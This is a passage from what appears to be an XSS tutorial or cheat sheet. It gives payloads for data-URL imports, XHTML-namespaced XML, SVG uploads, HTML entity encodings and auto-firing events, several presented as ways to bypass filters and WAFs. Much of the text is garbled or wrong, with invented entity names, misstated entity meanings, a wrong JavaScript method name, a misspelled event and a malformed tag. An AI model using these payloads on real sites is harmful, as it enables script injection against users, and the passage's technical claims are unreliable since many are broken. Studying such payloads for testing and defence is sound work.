- md: '## Dynamic imports


    Javascript allows you to dynamically load a module using import() it''s like a
    regular function except it allows the JavaScript engine to choose if it''s actually
    needed. This function-like expression allows you to specify URLs to import it
    allows you to specify a data URL to execute arbitrary JavaScript:


    ```javascript

    import(''data:text/javascript,alert(1)'')

    ```


    ## XHTML namespace in XML


    If you have control over an XML file with a content type of text/xml it''s still
    possible to execute JavaScript if you provide an XHTML namespace. However, just
    adding a name to the img element will allow it to be rendered as XHTML:


    ```xml

    <xml>

    <text>hello<img src="1" onerror="alert(1)" /></text>

    </xml>

    ```


    Without a namespace the browser will render the above code as XML and show the
    XML view.


    ```xml

    <xml>

    <text>hello<img src="1" onerror="alert(1)" xmlns="http://www.w3.org/1999/xhtml"
    /> </text>

    </xml>

    ```


    This can be useful for file uploads or when you have control over a REST API response
    served with an XML content type.


    ## SVG uploads


    It''s common to allow image file uploads on a web application but many forget
    you can use script inside the uploaded SVG documents. Unlike SVG the parsing is
    stricter when using an SVG with the correct mime type. This means you need to
    ensure the correct namespace attribute has been added and it should conform to
    XML parsing rules e.g all attributes should be quoted.


    ```svg

    <svg id=''x'' xmlns=''http://www.w3.org/2000/svg'' xmlns:link=''http://www.w3.org/1999/x''

    width=''100'' height=''100''>

    <image href="1" onerror=''alert(1)'' />

    </svg>

    ```


    You can prevent exploitation of this by obviously filtering the SVG but if you
    can''t do that you can always serve the file with a content disposition header
    and value attachment:


    Content-Disposition: attachment


    This should prevent the SVG from being rendered in a modern browser. There is
    a caveat though: if it is embedded via the <use> element it will still render.


    ## SVG use elements


    As mentioned above you can use JavaScript execution by embedding an SVG document
    using the <use> element SVG. This works provided that the document is on the same
    domain. You can also use data URLs and I will demonstrate this below:


    ```html

    <svg href="data:image/svg+xml,&lt;svg id=''x'' xmlns=''http://www.w3.org/2000/svg\n&gt;&lt;image
    href=''1'' onerror=''alert(1)''&gt;&lt;/svg&gt;*x" />

    ```


    Notice because the data URL using a valid SVG mime type follows the stricter rules.
    It''s also worth noting that even though this is a data URL it won''t be executed
    from a null origin, it will inherit the origin from the page.


    ## HTML entities


    HTML has a wide range of encoding options. In this section I''m going to go through
    the various ways you can encode characters with entities and finish off section
    with a few examples.


    ## Decimal entities


    You can use character codes to represent different characters, they are prefixed
    with &# and ends with an optional semicolon. For example the character "j" is
    represented as the character code 106. To produce this character simply have to
    combine the prefix with the code, followed by an optional semi-colon. You can
    also use many zeros as you like before the character code:


    - 1 <a href="&#106;avascript:alert(1337)">test1</a>

    - 2 <a href="&#106;avascript:alert(1337)">test2</a>

    - 3 <a href="&#x00000000&#106;avascript:alert(1337)">test3</a>


    Converting to hex is not easy you just need to look up the characters and convert
    the character to a character code using codePoint():


    ```javascript

    ''j''.codePoint(0)

    ```


    ## Hex entities


    There are a lot of similarities with hex entities as decimal but there''s a slightly
    different prefix. You use &x a as the prefix and convert the character code to
    hex. The semicolon is optional again if there is an extra character that is valid
    he''s going to produce a different character so you need to ensure the following
    character isn''t valid


    - 1 <a href="&#x6a;avascript:alert(1337)">test1</a>

    - 2 <a href="&#x7a;avascript:alert(1337)">test2</a>

    - 3 <a href="&#x00000000&#x6a;avascript:alert(1337)">test3</a>

    - 4 <a href="&#x61;script:alert(1337)">test4</a>


    The preceding example will fail because "a" is valid hex and therefore produces
    a different character than the required "j". The last example works because "s"
    isn''t valid so the entity produces the correct character. To produce this just
    need to get the code again but convert to hex like:


    ```javascript

    ''j''.codePoint(0).toString(16)

    ```


    It''s worth noting when you have a hex value with a leading zero actual it will
    still work:


    - 1 <a href="&#x6a;javascript:alert(1)">test</a>


    ## Named entities


    As you are aware HTML also supports named entities; these allow you to represent
    different characters using a specific name. The most common named entities are
    &lt; and &gt;. For certain entities the semicolon is optional but will be decoded
    depending on what the character is.


    - 1 <a href="&lt;src/onerror=alert(1)&gt;">test1</a>

    - 2 <a href="&lt;onclick=alert(1)&gt;">test2</a>


    In the first example greater than will be decoded less than won''t in the second
    example both will be because the browser is expecting a continuation of the named
    entity.


    ## HTML5 named entities


    HTML5 introduced a bunch of new entities that are useful for XSS. In order to
    use them be correctly though That means missing semicolon. Out of all the entities
    &colon; is probably most useful if you use it to inject a JavaScript URL without
    a colon:


    - 1 <a href="javascript:alert(1337)">test</a>


    Other entities are &par; &lsq;&rc; is a closing parenthesis. &lt; translates to
    opening parenthesis and &bol; is a backslash character and &sq; are square brackets
    and &lt; are right and left curly braces. Here''s how to use the &lt; &gt; entities:


    - 1 <a href="javascript:alert(1337)&rpar;">test</a>


    There are even entities for new line and tab which we learned can be used inside
    the JavaScript protocol:


    - 1 <a href="javascript&NewLine;&Tab;&colon;alert(1337)&rpar;">test</a>


    If you can manage to inject but parentheses are being blocked by a WAF, you can
    use named entities for the backtick character, there are two of which:


    - 1 <a href="javascript:alert&grave;1337&grave;">test</a>

    - 2 <a href="javascript:alert&grave;1337&grave;">test</a>


    ## Events


    ### onafterscriptexecute


    There are many notable events that fire without user interaction and these are
    most useful if do not have to convince the victim to click on anything. I''m going
    to highlight the less known events since they will be most useful for bypassing
    filters and WAFs. The onafterscriptexecute is a Firefox only event and as the
    name suggests will fire after script is executed. It''s really cool about this
    event that it can be used on any tag, the only downside is it to be inside the
    tag you inject:


    ```html

    <xss onafterscriptexecute=alert(1)><script></script>

    ```


    You could use this to inject an opening tag and a pre-existing script could be
    loaded inside it, this would be enough to fire the event. There is a related event
    called onbeforescriptexecute again this Firefox only and requires an existing
    script.


    ### ontoggle


    This is probably well known than the other tricks. You can get the ontoggle event
    to fire automatically if you force the details element to be expanded.


    ```html

    <details ontoggle=alert(1) open>test</details>

    ```


    ### unhandledrejection


    This is a relatively obscure event that only works on Firefox. It requires a promise
    without a catch clause. To exploit a site with you need an existing script that
    has an unhandled rejection.


    ```html

    <body onhandledrejection=alert(1)"><script>fetch(''//xyz'')</script>

    ```


